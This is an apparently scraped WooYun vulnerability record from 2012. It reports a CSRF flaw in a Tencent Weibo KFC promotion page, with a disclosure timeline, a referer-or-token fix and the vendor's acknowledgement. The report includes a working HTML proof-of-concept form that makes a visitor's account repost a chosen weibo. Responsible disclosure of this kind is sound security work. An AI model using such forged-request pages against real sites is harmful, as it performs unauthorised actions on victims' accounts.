{"id": 18424, "wybug_id": "wooyun-2012-08851", "wybug_title": "腾讯微博KFC推广活动CSRF", "wybug_corp": "腾讯", "wybug_author": "horseluke", "wybug_date": "2012-06-27 14:16", "wybug_open_date": "2012-08-11 14:17", "wybug_type": "CSRF", "wybug_level": "低", "wybug_rank_0": "2", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-06-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-06-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-07-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-07-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-07-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-08-11：\t细节向公众公开  简要描述： 腾讯微博KFC推广活动存在一个CSRF，可以转发指定微博 详细说明：  最近进入腾讯微博的界面就明晃晃地看到那个KFC推广活动页面：http://kfc.qq.com/进去转了一圈，结果发现转发微博和评论微博两个功能均存在未对referer校验的CSRF，攻击者可以指定微博进行转发和评论，但是否有频次限制，没有确定。现在仅上转发微博的CSRF测试代码，请保存为HTML再测试。代码写的差请见谅：\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /><title>腾讯微博“KFC有料同享 第二杯半价” CSRF</title></head><body>\t<form id=\"repostweibo\" name=\"repostweibo\" action=\"http://kfc.qq.com/feed/retweet/\" method=\"post\">\t\tid(不知道是啥参数，不改动):<input type=\"text\" name=\"id\" value=\"140\" />\t\t微博id（http://t.qq.com/p/t/xxxxxxx）：<input type=\"text\" name=\"tweet_id\" value=\"161049055696422\" />\t\t微博内容：<input type=\"text\" name=\"content\" value=\"asdfasdfadsfsafadfsadfsadfsadfsadfsadf\" />\t</form>    <input type=\"button\" onclick=\"submit();return false;\" value=\"测试开始\" />        <script>\tfunction submit(){\t\tif(confirm(\"准备提交测试攻击（转发发微博）？非技术人员请勿点击，否则引起电脑自爆概不负责！\")){\t\t\tdocument.getElementById('repostweibo').submit();\t\t\talert('提交测试攻击完毕！');\t\t}\t\treturn false;\t}\t</script></body></html>\n   漏洞证明：  \n\n   修复方案：  敏感操作进行referer校验或者加不可预测token   版权声明：转载请注明来源 horseluke@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2012-06-27 14:53 厂商回复： thx 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}